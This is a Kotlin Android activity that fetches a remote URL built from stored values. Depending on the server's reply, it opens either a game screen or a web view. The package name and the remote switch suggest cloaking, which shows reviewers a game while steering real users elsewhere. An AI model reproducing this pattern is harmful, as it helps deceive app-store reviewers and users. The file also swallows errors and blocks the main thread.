package com.gamel.black

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.gamel.R
import com.gamel.black.CNST.C1
import com.gamel.black.CNST.D1
import com.gamel.game.GameAct
import com.orhanobut.hawk.Hawk
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.android.synthetic.main.activity_fact.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

@AndroidEntryPoint
class FAct : AppCompatActivity() {
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_fact)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == CNST.jsoupCheck) {
                    Intent(applicationContext, GameAct::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Web::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun coroutineTask(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")

        val forJsoupSetNaming: String = CNST.lru + CNST.odone + hawk
        val forJsoupSetAppLnk: String = CNST.lru + CNST.odone + hawkAppLink

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                getCodeFromUrl(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                getCodeFromUrl(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}